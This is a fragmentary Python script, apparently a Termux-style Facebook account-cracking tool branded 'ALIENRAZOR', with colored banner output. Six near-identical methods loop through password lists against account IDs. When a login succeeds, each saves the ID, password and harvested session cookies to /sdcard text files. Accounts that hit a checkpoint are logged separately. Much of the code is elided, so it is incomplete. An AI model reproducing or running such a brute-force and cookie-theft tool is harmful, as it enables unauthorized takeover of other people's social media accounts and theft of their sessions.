...
Hash = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
...
{red}[{white}√{red}]{green} Author  {white}▶ {green}︎ALIENRAZOR 
...
try:
    def __MTDONEE__(sid, name, psw,tl):
        try:
            global oks,cps,loop
            Hash = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{Hash}ALIENRAZOR{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/ALIENRAZOR-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/ALIENRAZOR-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
                     open('/sdcard/ALIENRAZOR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/ALIENRAZOR-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/ALIENRAZOR-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/ALIENRAZOR-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/ALIENRAZOR-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                        #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/ALIENRAZOR-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/ALIENRAZOR-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/ALIENRAZOR-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/ALIENRAZOR-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
                open('/sdcard/ALIENRAZOR-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
                open('/sdcard/ALIENRAZOR-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                oks.append(sid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
